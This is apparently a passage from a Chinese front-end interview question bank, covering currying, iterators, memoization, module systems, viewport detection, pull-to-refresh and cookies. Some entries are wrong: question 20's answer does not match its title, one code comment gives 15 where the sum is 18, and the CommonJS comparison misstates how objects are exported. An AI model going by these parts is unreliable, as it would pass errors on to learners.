是为了方式外面调用时,绑定了this,而导致这个里面执行 fn 时的混乱\\n            return fn.apply(this, args);\\n        } else {\\n            // 当参数不够的时候, 需要返回一个函数,来接续接收传入的参数,所以 在这 就需要把传入的所有参数,进行一次拼接\\n            return function (...smallArgs) {\\n                // 这个里面用了递归,来检查参数 是否达到,达到了,就运行传入的函数(fn)\\n                return receivedParameters.apply(this, [...args, ...smallArgs])\\n            }\\n        }\\n    }\\n    return receivedParameters\\n}\\n\\n// 使用\\nfunction fun(n, m, b) { // fun的参数个数,是可以 通过 fun.length 拿到的\\n    return n + m + b\\n}\\n\\nconst test = currying(fun);\\n\\nconsole.log(test(1, 2, 3));\\nconsole.log(test(1)(2, 3))\\nconsole.log(test(1)(2)(3));\\n</code></pre>\\n</details>\\n\\n<h2>20. CommonJS和ES6模块的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> Iterator 描述</li>\\n</ul>\\n<p>迭代器（iterator），是确使用户可在容器对象（container，例如链表或数组）上遍访的对象，使用该接口无需关心对象的内部实现细节。</p>\\n<p>注：迭代器可以帮助我们去遍历某个数据结构。</p>\\n<p><a href=\\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Iterators_and_Generators#%E8%BF%AD%E4%BB%A3%E5%99%A8\\">文档</a></p>\\n<ul>\\n<li><strong>2：</strong> 实现一个简单的迭代器</li>\\n</ul>\\n<p>迭代器是一个对象，但是需要符合<a href=\\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%8D%8F%E8%AE%AE\\">迭代器协议</a>。</p>\\n<p><a href=\\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%8D%8F%E8%AE%AE\\">文档</a>\\n注：在使用的过程中，根据需求，进行修改。</p>\\n<pre><code class=\\"language-javascript\\">/**\\n * 下面就是一个迭代器\\n * 但是他是毫无作用的\\n */\\n/*\\nconst iterator = {\\n    next: function () {\\n        return {done: true, value: &quot;test&quot;};\\n    }\\n};\\n*/\\n\\n/**\\n * 创建一个迭代器，去访问一个数组\\n * 如果迭代器能够生成序列中的下一个值，则返回 false 布尔值。（这等价于没有指定 done 这个属性。）\\n *\\n * 如果迭代器已将序列迭代完毕，则为 true。这种情况下，value 是可选的，如果它依然存在，即为迭代结束之后的默认返回值。\\n */\\nfunction createArrayIterator(arr) {\\n    let index = 0;\\n    const arrIterator = {\\n        next: function () {\\n            // return {done: false, value: &quot;你好&quot;};\\n            // return {done: false, value: &quot;哈哈&quot;};\\n            // return {done: false, value: &quot;啊啊&quot;};\\n            // return {done: true, value: undefined};\\n            if (index &lt; arr.length) {\\n                return {done: false, value: arr[index++]};\\n            } else {\\n                return {done: true, value: undefined};\\n            }\\n        }\\n    };\\n    return arrIterator;\\n}\\n\\nconst arr1 = [&quot;你好&quot;, &quot;哈哈&quot;, &quot;啊啊&quot;];\\nconst arr1Iterator = createArrayIterator(arr1);\\n\\nconsole.log(arr1Iterator.next());\\nconsole.log(arr1Iterator.next());\\nconsole.log(arr1Iterator.next());\\n// 前面的都能访问到，后面的就无法访问了\\nconsole.log(arr1Iterator.next());\\nconsole.log(arr1Iterator.next());\\n\\nconst arr2 = [1, 2, 3, 4, 5, 6];\\nconst arr2Iterator = createArrayIterator(arr2);\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\n</code></pre>\\n<p> <img src=\\"https://not-have.github.io/file/images/image-20240202230330197.png\\" alt=\\"image-20240202230330197\\"></p>\\n</details>\\n\\n<h2>21. JS 如何实现函数缓存</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> 是什么</li>\\n</ul>\\n<p>就是实用一个对象来存储计算过的结果，当再次调用函数时，先检查结果是否已经存在，如果存在，则直接返回结果，否则再进行计算。\\n本质上是实用空间换时间。\\n常用于缓存数据计算和缓存对象：</p>\\n<pre><code class=\\"language-js\\">const add = (a,b) =&gt; a+b;\\nconst calc = memoize(add); // 函数缓存\\ncalc(10,20);// 30\\ncalc(10,20);// 30 缓存\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 实现</li>\\n</ul>\\n<p>注：函数缓存主要依靠 <code>闭包、柯里化、高阶函数</code></p>\\n<h5>1）闭包</h5>\\n<pre><code class=\\"language-js\\">(function() {\\n    var a = 1; // 在 IIFE (立即调用的函数表达式) 内部定义了变量 a\\n    function add() {\\n        const b = 2; // 在 add 函数内部定义了变量 b\\n        let sum = b + a; // sum 是 add 函数内部的局部变量，b 和 a 都在其作用域内\\n        console.log(sum); // 输出 3\\n    }\\n    \\n    add(); // 调用 add 函数\\n})();\\n</code></pre>\\n<h5>2）柯里化</h5>\\n<pre><code class=\\"language-js\\">// 非函数柯里化\\nvar add = function (x,y) {\\n    return x+y;\\n}\\nadd(3, 15) // 15\\n\\n// 函数柯里化\\nvar add2 = function (x) {\\n    return function (y) {\\n        return x+y;\\n    }\\n}\\nconst str = add2(3)(15) //15\\n\\nconsole.log(`永远喜欢 ${str} 岁的 girl ！！！`);\\n</code></pre>\\n<h5>3）高阶函数</h5>\\n<pre><code class=\\"language-js\\">function foo(){\\n  var a = 2;\\n\\n  function bar() {\\n    console.log(a);\\n  }\\n  return bar;\\n}\\nvar baz = foo();\\nbaz();\\n</code></pre>\\n<h5>4）实现函数缓存</h5>\\n<pre><code class=\\"language-js\\">var add = function (x, y) {\\n    return x + y;\\n}\\n\\n/**\\n * 函数缓存\\n * \\n * @param {*} func 要缓存的函数\\n * @param {*} content 上下文\\n */\\nconst memoize = function (func, content) {\\n  // 创建一个缓存对象，用来存储已计算的结果，避免重复计算\\n  let cache = Object.create(null)\\n\\n  // 如果没有传递 content 参数，则将 content 设置为当前上下文 this\\n  content = content || this\\n  \\n  // 返回一个新的函数，它会接收传入的参数，并进行缓存判断\\n  return (...key) =&gt; {\\n    // 使用 JSON.stringify 将 key 数组转换为字符串，确保相同的参数值被一致缓存\\n    const cacheKey = JSON.stringify(key);\\n\\n    // 检查缓存中是否已经存储了当前参数的计算结果\\n    if (!cache[cacheKey]) {\\n      // 如果缓存中没有，调用 func 并将结果存储在 cache 中\\n      // func.apply(content, key) 用来调用 func，传递 content 作为上下文，key 作为参数\\n      cache[cacheKey] = func.apply(content, key);\\n    }\\n    \\n    // 返回缓存中的结果（如果已计算过）\\n    return cache[cacheKey];\\n  }\\n}\\n\\n/**\\n * 使用\\n */\\nconst calc = memoize(add);\\nconst num1 = calc(100, 200);  // 计算并缓存结果\\nconsole.log(num1);  // 300\\n\\nconst num2 = calc(100, 200);  // 从缓存中获取结果\\nconsole.log(num2);  // 300\\n</code></pre>\\n<h5>5）使用场景</h5>\\n<p>对于昂贵的函数调用，执行复杂计算的函数\\n对于具有有限且高度重复输入范围的函数\\n对于具有重复输入值的递归函数\\n对于纯函数，即每次使用特定输入调用时返回相同输出的函数</p>\\n</details>\\n\\n<h2>22. CommonJS和ES6模块的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>CommonJS模块是同步加载的，ES6模块是异步加载的。</p>\\n</li>\\n<li><p>CommonJS模块的导出是值的拷贝，ES6模块的导出是值的引用。</p>\\n</li>\\n<li><p>CommonJS模块的导入是动态的，ES6模块的导入是静态的。</p>\\n</li>\\n<li><p>CommonJS模块的导出是函数时，导出的函数是值的拷贝，ES6模块的导出是函数时，导出的函数是值的引用。</p>\\n</li>\\n<li><p>CommonJS模块的导出是对象时，导出的对象是值的拷贝，ES6模块的导出是对象时，导出的对象是值的引用。</p>\\n</li>\\n<li><p>CommonJS模块的导出是类时，导出的类是值的拷贝，ES6模块的导出是类时，导出的类是值的引用。</p>\\n</li>\\n</ul>\\n<h2>23. 介绍一下Promise</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>Promise 是一种用于处理异步操作的 JavaScript 对象。它代表了一个尚未完成但预期将来会完成的操作的结果。</p>\\n<p>Promise 对象有三种状态：</p>\\n<ul>\\n<li><p>Pending（进行中）：初始状态，既不是成功，也不是失败状态。</p>\\n</li>\\n<li><p>Fulfilled（已成功）：意味着操作成功完成。</p>\\n</li>\\n<li><p>Rejected（已失败）：意味着操作失败。</p>\\n</li>\\n</ul>\\n<p>Promise 对象使用 <code>then</code> 方法来处理成功和失败的情况。<code>then</code> 方法接受两个参数：一个用于处理成功情况的回调函数和一个用于处理失败情况的回调函数。</p>\\n<pre><code class=\\"language-js\\">const promise = new Promise((resolve, reject) =&gt; {\\n\\n\\n})\\n</code></pre>\\n<h2>24. 如何判断一个元素是否在可视区域内？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：用途</strong></li>\\n</ul>\\n<p>可视区域即我们浏览网页的设备肉眼可见的区域，如下图</p>\\n<p><img src=\\"/public/images/3_JavaScript_20241230001543.png\\" alt=\\"\\"></p>\\n<p>在日常开发中，我们经常需要判断目标元素是否在视窗之内或者和视窗的距离小于一个值（例如 100 px），从而实现一些常用的功能，例如：</p>\\n<blockquote>\\n<ul>\\n<li>图片的懒加载</li>\\n<li>列表的无限滚动</li>\\n<li>计算广告元素的曝光情况</li>\\n<li>可点击链接的预加载</li>\\n</ul>\\n</blockquote>\\n<ul>\\n<li><strong>实现方式: 3</strong></li>\\n</ul>\\n<h5>1）offsetTop、scrollTop</h5>\\n<p><code>offsetTop</code>，元素的上外边框至包含元素的上内边框之间的像素距离，其他<code>offset</code>属性如下图所示：</p>\\n<p><img src=\\"/public/images/3_JavaScript_20241230001827.png\\" alt=\\"\\"></p>\\n<p>下面再来了解下<code>clientWidth</code>、<code>clientHeight</code>：</p>\\n<ul>\\n<li><code>clientWidth</code>：元素内容区宽度加上左右内边距宽度，即<code>clientWidth = content + padding</code></li>\\n<li><code>clientHeight</code>：元素内容区高度加上上下内边距高度，即<code>clientHeight = content + padding</code></li>\\n</ul>\\n<p>这里可以看到<code>client</code>元素都不包括外边距</p>\\n<p>最后，关于<code>scroll</code>系列的属性如下：</p>\\n<ul>\\n<li><p><code>scrollWidth</code> 和 <code>scrollHeight</code> 主要用于确定元素内容的实际大小</p>\\n</li>\\n<li><p><code>scrollLeft</code> 和 <code>scrollTop</code> 属性既可以确定元素当前滚动的状态，也可以设置元素的滚动位置</p>\\n</li>\\n<li><p>垂直滚动 <code>scrollTop &gt; 0</code></p>\\n</li>\\n<li><p>水平滚动 <code>scrollLeft &gt; 0</code></p>\\n</li>\\n<li><p>将元素的 <code>scrollLeft</code> 和 <code>scrollTop</code> 设置为 0，可以重置元素的滚动位置</p>\\n</li>\\n</ul>\\n<h5>注意</h5>\\n<ul>\\n<li>上述属性都是只读的，每次访问都要重新开始</li>\\n</ul>\\n<p>下面再看看如何实现判断：</p>\\n<p>公式如下：</p>\\n<pre><code class=\\"language-js\\">el.offsetTop - document.documentElement.scrollTop &lt;= viewPortHeight\\n</code></pre>\\n<p>代码实现：</p>\\n<pre><code class=\\"language-js\\">function isInViewPortOfOne (el) {\\n    // viewPortHeight 兼容所有浏览器写法\\n    const viewPortHeight = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight \\n    const offsetTop = el.offsetTop\\n    const scrollTop = document.documentElement.scrollTop\\n    const top = offsetTop - scrollTop\\n    return top &lt;= viewPortHeight\\n}\\n</code></pre>\\n<h5>2）getBoundingClientRect</h5>\\n<p>返回值是一个 <code>DOMRect</code>对象，拥有<code>left</code>, <code>top</code>, <code>right</code>, <code>bottom</code>, <code>x</code>, <code>y</code>, <code>width</code>, 和 <code>height</code>属性</p>\\n<pre><code class=\\"language-js\\">const target = document.querySelector(&#39;.target&#39;);\\nconst clientRect = target.getBoundingClientRect();\\nconsole.log(clientRect);\\n\\n// {\\n//   bottom: 556.21875,\\n//   height: 393.59375,\\n//   left: 333,\\n//   right: 1017,\\n//   top: 162.625,\\n//   width: 684\\n// }\\n</code></pre>\\n<p>属性对应的关系图如下所示：</p>\\n<p><img src=\\"/public/images/3_JavaScript_20241230002050.png\\" alt=\\"\\"></p>\\n<p>当页面发生滚动的时候，<code>top</code>与<code>left</code>属性值都会随之改变</p>\\n<p>如果一个元素在视窗之内的话，那么它一定满足下面四个条件：</p>\\n<ul>\\n<li>top 大于等于 0</li>\\n<li>left 大于等于 0</li>\\n<li>bottom 小于等于视窗高度</li>\\n<li>right 小于等于视窗宽度</li>\\n</ul>\\n<p>实现代码如下：</p>\\n<pre><code class=\\"language-js\\">function isInViewPort(element) {\\n  const viewWidth = window.innerWidth || document.documentElement.clientWidth;\\n  const viewHeight = window.innerHeight || document.documentElement.clientHeight;\\n  const {\\n    top,\\n    right,\\n    bottom,\\n    left,\\n  } = element.getBoundingClientRect();\\n\\n  return (\\n    top &gt;= 0 &amp;&amp;\\n    left &gt;= 0 &amp;&amp;\\n    right &lt;= viewWidth &amp;&amp;\\n    bottom &lt;= viewHeight\\n  );\\n}\\n</code></pre>\\n<h5>3）Intersection Observer</h5>\\n<p><code>Intersection Observer</code> 即重叠观察者，从这个命名就可以看出它用于判断两个元素是否重叠，因为不用进行事件的监听，性能方面相比 <code>getBoundingClientRect</code> 会好很多</p>\\n<p>使用步骤主要分为两步：创建观察者和传入被观察者</p>\\n<h6>创建观察者</h6>\\n<pre><code class=\\"language-js\\">const options = {\\n  // 表示重叠面积占被观察者的比例，从 0 - 1 取值，\\n  // 1 表示完全被包含\\n  threshold: 1.0, \\n  root:document.querySelector(&#39;#scrollArea&#39;) // 必须是目标元素的父级元素\\n};\\n\\nconst callback = (entries, observer) =&gt; { ....}\\n\\nconst observer = new IntersectionObserver(callback, options);\\n</code></pre>\\n<p>通过<code>new IntersectionObserver</code>创建了观察者 <code>observer</code>，传入的参数 <code>callback</code> 在重叠比例超过 <code>threshold</code> 时会被执行`</p>\\n<p>关于<code>callback</code>回调函数常用属性如下：</p>\\n<pre><code class=\\"language-js\\">// 上段代码中被省略的 callback\\nconst callback = function(entries, observer) { \\n    entries.forEach(entry =&gt; {\\n        entry.time;               // 触发的时间\\n        entry.rootBounds;         // 根元素的位置矩形，这种情况下为视窗位置\\n        entry.boundingClientRect; // 被观察者的位置举行\\n        entry.intersectionRect;   // 重叠区域的位置矩形\\n        entry.intersectionRatio;  // 重叠区域占被观察者面积的比例（被观察者不是矩形时也按照矩形计算）\\n        entry.target;             // 被观察者\\n    });\\n};\\n</code></pre>\\n<h6>传入被观察者</h6>\\n<p>通过 <code>observer.observe(target)</code> 这一行代码即可简单的注册被观察者</p>\\n<pre><code class=\\"language-js\\">const target = document.querySelector(&#39;.target&#39;);\\nobserver.observe(target);\\n</code></pre>\\n<h5>4）案例分析</h5>\\n<p>实现：创建了一个十万个节点的长列表，当节点滚入到视窗中时，背景就会从红色变为黄色</p>\\n<p><code>Html</code>结构如下：</p>\\n<pre><code class=\\"language-js\\">&lt;div class=&quot;container&quot;&gt;&lt;/div&gt;\\n</code></pre>\\n<p><code>css</code>样式如下：</p>\\n<pre><code class=\\"language-css\\">.container {\\n    display: flex;\\n    flex-wrap: wrap;\\n}\\n.target {\\n    margin: 5px;\\n    width: 20px;\\n    height: 20px;\\n    background: red;\\n}\\n</code></pre>\\n<p>往<code>container</code>插入1000个元素</p>\\n<pre><code class=\\"language-js\\">const $container = $(&quot;.container&quot;);\\n\\n// 插入 100000 个 &lt;div class=&quot;target&quot;&gt;&lt;/div&gt;\\nfunction createTargets() {\\n  const htmlString = new Array(100000)\\n    .fill(&#39;&lt;div class=&quot;target&quot;&gt;&lt;/div&gt;&#39;)\\n    .join(&quot;&quot;);\\n  $container.html(htmlString);\\n}\\n</code></pre>\\n<p>这里，首先使用 <code>getBoundingClientRect</code> 方法进行判断元素是否在可视区域</p>\\n<pre><code class=\\"language-js\\">function isInViewPort(element) {\\n    const viewWidth = window.innerWidth || document.documentElement.clientWidth;\\n    const viewHeight =\\n          window.innerHeight || document.documentElement.clientHeight;\\n    const { top, right, bottom, left } = element.getBoundingClientRect();\\n\\n    return top &gt;= 0 &amp;&amp; left &gt;= 0 &amp;&amp; right &lt;= viewWidth &amp;&amp; bottom &lt;= viewHeight;\\n}\\n</code></pre>\\n<p>然后开始监听<code>scroll</code>事件，判断页面上哪些元素在可视区域中，如果在可视区域中则将背景颜色设置为<code>yellow</code></p>\\n<pre><code class=\\"language-js\\">$(window).on(&quot;scroll&quot;, () =&gt; {\\n    console.log(&quot;scroll !&quot;);\\n    $targets.each((index, element) =&gt; {\\n        if (isInViewPort(element)) {\\n            $(element).css(&quot;background-color&quot;, &quot;yellow&quot;);\\n        }\\n    });\\n});\\n</code></pre>\\n<p>通过上述方式，可以看到可视区域颜色会变成黄色了，但是可以明显看到有卡顿的现象，原因在于我们绑定了<code>scroll</code>事件，<code>scroll</code>事件伴随了大量的计算，会造成资源方面的浪费</p>\\n<p>下面通过<code>Intersection Observer</code>的形式同样实现相同的功能</p>\\n<p>首先创建一个观察者</p>\\n<pre><code class=\\"language-js\\">const observer = new IntersectionObserver(getYellow, { threshold: 1.0 });\\n</code></pre>\\n<p><code>getYellow</code>回调函数实现对背景颜色改变，如下：</p>\\n<pre><code class=\\"language-js\\">function getYellow(entries, observer) {\\n    entries.forEach(entry =&gt; {\\n        $(entry.target).css(&quot;background-color&quot;, &quot;yellow&quot;);\\n    });\\n}\\n</code></pre>\\n<p>最后传入观察者，即<code>.target</code>元素</p>\\n<pre><code class=\\"language-js\\">$targets.each((index, element) =&gt; {\\n    observer.observe(element);\\n});\\n</code></pre>\\n<p>可以看到功能同样完成，并且页面不会出现卡顿的情况</p>\\n</details>\\n\\n<h2>25. 如何实现一个上拉加载，下拉刷新？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>2：</strong> 上拉加载</li>\\n</ul>\\n<p>首先可以看一张图</p>\\n<p><img src=\\"/public/images/3_JavaScript_20241230002614.png\\" alt=\\"\\"></p>\\n<p>上拉加载的本质是页面触底，或者快要触底时的动作</p>\\n<p>判断页面触底我们需要先了解一下下面几个属性</p>\\n<ul>\\n<li><p><code>scrollTop</code>：滚动视窗的高度距离<code>window</code>顶部的距离，它会随着往上滚动而不断增加，初始值是0，它是一个变化的值</p>\\n</li>\\n<li><p><code>clientHeight</code>:它是一个定值，表示屏幕可视区域的高度；</p>\\n</li>\\n<li><p><code>scrollHeight</code>：页面不能滚动时也是存在的,此时scrollHeight等于clientHeight。scrollHeight表示<code>body</code>所有元素的总长度(包括body元素自身的padding)</p>\\n</li>\\n</ul>\\n<p>综上我们得出一个触底公式：</p>\\n<pre><code class=\\"language-js\\">scrollTop + clientHeight &gt;= scrollHeight\\n</code></pre>\\n<p>简单实现</p>\\n<pre><code class=\\"language-js\\">let clientHeight  = document.documentElement.clientHeight; //浏览器高度\\nlet scrollHeight = document.body.scrollHeight;\\nlet scrollTop = document.documentElement.scrollTop;\\n \\nlet distance = 50;  //距离视窗还用50的时候，开始触发；\\n\\nif ((scrollTop + clientHeight) &gt;= (scrollHeight - distance)) {\\n    console.log(&quot;开始加载数据&quot;);\\n}\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 下拉刷新</li>\\n</ul>\\n<p>下拉刷新的本质是页面本身置于顶部时，用户下拉时需要触发的动作</p>\\n<p>关于下拉刷新的原生实现，主要分成三步：</p>\\n<ul>\\n<li>监听原生<code>touchstart</code>事件，记录其初始位置的值，<code>e.touches[0].pageY</code>；</li>\\n<li>监听原生<code>touchmove</code>事件，记录并计算当前滑动的位置值与初始位置值的差值，大于<code>0</code>表示向下拉动，并借助CSS3的<code>translateY</code>属性使元素跟随手势向下滑动对应的差值，同时也应设置一个允许滑动的最大值；</li>\\n<li>监听原生<code>touchend</code>事件，若此时元素滑动达到最大值，则触发<code>callback</code>，同时将<code>translateY</code>重设为<code>0</code>，元素回到初始位置</li>\\n</ul>\\n<p>举个例子：</p>\\n<p><code>Html</code>结构如下：</p>\\n<pre><code class=\\"language-js\\">&lt;main&gt;\\n    &lt;p class=&quot;refreshText&quot;&gt;&lt;/p &gt;\\n    &lt;ul id=&quot;refreshContainer&quot;&gt;\\n        &lt;li&gt;111&lt;/li&gt;\\n        &lt;li&gt;222&lt;/li&gt;\\n        &lt;li&gt;333&lt;/li&gt;\\n        &lt;li&gt;444&lt;/li&gt;\\n        &lt;li&gt;555&lt;/li&gt;\\n        ...\\n    &lt;/ul&gt;\\n&lt;/main&gt;\\n</code></pre>\\n<p>监听<code>touchstart</code>事件，记录初始的值</p>\\n<pre><code class=\\"language-js\\">var _element = document.getElementById(&#39;refreshContainer&#39;),\\n    _refreshText = document.querySelector(&#39;.refreshText&#39;),\\n    _startPos = 0,  // 初始的值\\n    _transitionHeight = 0; // 移动的距离\\n\\n_element.addEventListener(&#39;touchstart&#39;, function(e) {\\n    _startPos = e.touches[0].pageY; // 记录初始位置\\n    _element.style.position = &#39;relative&#39;;\\n    _element.style.transition = &#39;transform 0s&#39;;\\n}, false);\\n</code></pre>\\n<p>监听<code>touchmove</code>移动事件，记录滑动差值</p>\\n<pre><code class=\\"language-js\\">_element.addEventListener(&#39;touchmove&#39;, function(e) {\\n    // e.touches[0].pageY 当前位置\\n    _transitionHeight = e.touches[0].pageY - _startPos; // 记录差值\\n\\n    if (_transitionHeight &gt; 0 &amp;&amp; _transitionHeight &lt; 60) { \\n        _refreshText.innerText = &#39;下拉刷新&#39;; \\n        _element.style.transform = &#39;translateY(&#39;+_transitionHeight+&#39;px)&#39;;\\n\\n        if (_transitionHeight &gt; 55) {\\n            _refreshText.innerText = &#39;释放更新&#39;;\\n        }\\n    }                \\n}, false);\\n</code></pre>\\n<p>最后，就是监听<code>touchend</code>离开的事件</p>\\n<pre><code class=\\"language-js\\">_element.addEventListener(&#39;touchend&#39;, function(e) {\\n    _element.style.transition = &#39;transform 0.5s ease 1s&#39;;\\n    _element.style.transform = &#39;translateY(0px)&#39;;\\n    _refreshText.innerText = &#39;更新中...&#39;;\\n    // todo...\\n\\n}, false);\\n</code></pre>\\n<p>从上面可以看到，在下拉到松手的过程中，经历了三个阶段：</p>\\n<ul>\\n<li><p>当前手势滑动位置与初始位置差值大于零时，提示正在进行下拉刷新操作</p>\\n</li>\\n<li><p>下拉到一定值时，显示松手释放后的操作提示</p>\\n</li>\\n<li><p>下拉到达设定最大值松手时，执行回调，提示正在进行更新操作</p>\\n</li>\\n<li><p><strong>2：</strong> 案例</p>\\n</li>\\n</ul>\\n<p>在实际开发中，我们更多的是使用第三方库，下面以<code>better-scroll</code>进行举例：</p>\\n<p>HTML结构</p>\\n<pre><code class=\\"language-js\\">&lt;div id=&quot;position-wrapper&quot;&gt;\\n    &lt;div&gt;\\n        &lt;p class=&quot;refresh&quot;&gt;下拉刷新&lt;/p &gt;\\n        &lt;div class=&quot;position-list&quot;&gt;\\n   &lt;!--列表内容--&gt;\\n        &lt;/div&gt;\\n        &lt;p class=&quot;more&quot;&gt;查看更多&lt;/p &gt;\\n    &lt;/div&gt;\\n&lt;/div&gt;\\n</code></pre>\\n<p>实例化上拉下拉插件，通过<code>use</code>来注册插件</p>\\n<pre><code class=\\"language-js\\">import BScroll from &quot;@better-scroll/core&quot;;\\nimport PullDown from &quot;@better-scroll/pull-down&quot;;\\nimport PullUp from &#39;@better-scroll/pull-up&#39;;\\nBScroll.use(PullDown);\\nBScroll.use(PullUp);\\n</code></pre>\\n<p>实例化<code>BetterScroll</code>，并传入相关的参数</p>\\n<pre><code class=\\"language-js\\">let pageNo = 1,pageSize = 10,dataList = [],isMore = true;  \\nvar scroll= new BScroll(&quot;#position-wrapper&quot;,{\\n    scrollY:true,//垂直方向滚动\\n    click:true,//默认会阻止浏览器的原生click事件，如果需要点击，这里要设为true\\n    pullUpLoad:true,//上拉加载更多\\n    pullDownRefresh:{\\n        threshold:50,//触发pullingDown事件的位置\\n        stop:0//下拉回弹后停留的位置\\n    }\\n});\\n//监听下拉刷新\\nscroll.on(&quot;pullingDown&quot;,pullingDownHandler);\\n//监测实时滚动\\nscroll.on(&quot;scroll&quot;,scrollHandler);\\n//上拉加载更多\\nscroll.on(&quot;pullingUp&quot;,pullingUpHandler);\\n\\nasync function pullingDownHandler(){\\n    dataList=[];\\n    pageNo=1;\\n    isMore=true;\\n    $(&quot;.more&quot;).text(&quot;查看更多&quot;);\\n    await getlist();//请求数据\\n    scroll.finishPullDown();//每次下拉结束后，需要执行这个操作\\n    scroll.refresh();//当滚动区域的dom结构有变化时，需要执行这个操作\\n}\\nasync function pullingUpHandler(){\\n    if(!isMore){\\n        $(&quot;.more&quot;).text(&quot;没有更多数据了&quot;);\\n        scroll.finishPullUp();//每次上拉结束后，需要执行这个操作\\n        return;\\n    }\\n    pageNo++;\\n    await this.getlist();//请求数据\\n    scroll.finishPullUp();//每次上拉结束后，需要执行这个操作\\n    scroll.refresh();//当滚动区域的dom结构有变化时，需要执行这个操作    \\n}\\nfunction scrollHandler(){\\n    if(this.y&gt;50) $(&#39;.refresh&#39;).text(&quot;松手开始加载&quot;);\\n    else $(&#39;.refresh&#39;).text(&quot;下拉刷新&quot;);\\n}\\nfunction getlist(){\\n    //返回的数据\\n    let result=....;\\n    dataList=dataList.concat(result);\\n    //判断是否已加载完\\n    if(result.length&lt;pageSize) isMore=false;\\n    //将dataList渲染到html内容中\\n}    \\n</code></pre>\\n<p>注意点：</p>\\n<p>使用 <code>better-scroll</code> 实现下拉刷新、上拉加载时要注意以下几点：</p>\\n<ul>\\n<li><code>wrapper</code> 里必须只有一个子元素</li>\\n<li>子元素的高度要比 <code>wrapper</code> 要高</li>\\n<li>使用的时候，要确定 <code>DOM</code> 元素是否已经生成，必须要等到 <code>DOM</code> 渲染完成后，再 <code>new BScroll()</code></li>\\n<li>滚动区域的 <code>DOM</code> 元素结构有变化后，需要执行刷新 <code>refresh()</code></li>\\n<li>上拉或者下拉，结束后，需要执行 <code>finishPullUp()</code> 或者 <code>finishPullDown()</code>，否则将不会执行下次操作</li>\\n<li><code>better-scroll</code>，默认会阻止浏览器的原生 <code>click</code> 事件，如果滚动内容区要添加点击事件，需要在实例化属性里设置 <code>click:true</code></li>\\n</ul>\\n</details>\\n\\n<h2>26. cookie 可以实现不同域共享吗？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>默认情况下，Cookie 不能在不同的顶级域名之间共享数据。</p>\\n</li>\\n<li><p>但是，如果两个域名属于同一主域名下的子域名，并且您设置了正确的 Domain 属性，那么在这些子域名之间是可以共享 Cookie 的。</p>\\n</li>\\n<li><p>例如，对于 sub1.example.com 和 sub2.example.com 这样的子域名，如果设置 Cookie 的 Domain 属性为 .example.com ，那么在这两个子域名之间，这个 Cookie 是可以共享和访问的。</p>\\n</li>\\n<li><p>然而，如果是完全不同的顶级域名，如 example.com 和 anotherdomain.com 之间，Cookie 是不能直接共享的。</p>\\n</li>\\n<li><p>此外，还需要注意 Cookie 的 Path 属性、安全属性（Secure）、HttpOnly 属性等，这些属性也会影响 Cookie 的使用范围和方式。</p>\\n</li>\\n</ul>\\n<h2>27. for in和for of的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>for…of 是ES6新增的遍历方式，允许遍历一个含有iterator接口的数据结构（数组、对象等）并且返回各项的值，和ES3中的for…in的区别如下</p>\\n</li>\\n<li><p>for…of 遍历获取的是对象的键值，for…in 获取的是对象的键名</p>\\n</li>\\n<li><p>for… in 会遍历对象的整个原型链，性能非常差不推荐使用，而 for … of 只遍历当前对象不会遍历原型链；</p>\\n</li>\\n<li><p>对于数组的遍历，for…in 会返回数组中所有可枚举的属性(包括原型链上可枚举的属性)，for…of 只返回数组的下标对应的属性值；</p>\\n</li>\\n</ul>\\n<h2>28. forEach和map的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>这方法都是用来遍历数组的，两者区别如下：</p>\\n</li>\\n<li><p>for…of 